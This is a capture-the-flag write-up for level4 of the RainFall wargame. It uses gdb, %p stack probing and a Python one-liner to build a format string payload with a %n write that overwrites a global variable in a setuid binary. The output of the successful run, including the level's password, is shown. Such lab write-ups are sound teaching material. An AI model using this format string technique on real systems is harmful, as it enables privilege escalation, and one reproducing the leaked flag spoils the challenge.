level4 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
```

level4 rights:
```Shell
-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
```

This binary has the same behaviour as the other one.
Decompiling with Ghidra on https://dogbolt.org/ shows the main difference with the previous executable: `m` is compared to a value much bigger than the size of the buffer (0x1025544, which is 16930116 in decimal for a buffer of size 520). Also, if the condition is met, we don't get a shell but the password itself.

We will try to apply the same method, but we must find a way to bypass the size problem.
First, we get `m` address from gdb:
```Shell
0x0804848d <+54>:    mov    0x8049810,%eax
0x08048492 <+59>:    cmp    $0x1025544,%eaxx
```
This is the address of `m` converted into Little Endian: `\x10\x98\x04\x08`.

Then, we get our buffer's position on the stack:
```Shell
level4@RainFall:~$ ./level4
AAAA %p %p %p %p %p %p %p %p %p %p %p %p
AAAA 0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141
```
Now we know it starts at the 12th index.

The only thing missing from our payload is the syntax to bypass the size limitation. With a bit of research, we found out that using the optional width field with `%d` allows us to print the correct number of characters before reaching `%n`.

Our payload will be:
```Shell
level4@RainFall:~$ python -c 'print("\x10\x98\x04\x08" + "%16930112d%12$n")' > /tmp/payload4
```

And the result is:
```Shell
level4@RainFall:~$ cat /tmp/payload4 | ./level4
[...]
-1208015184
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
Note that there is no need to keep stdin open, as we do not launch `/bin/sh` but a simple `cat` command. The extra number corresponds to `%d`.
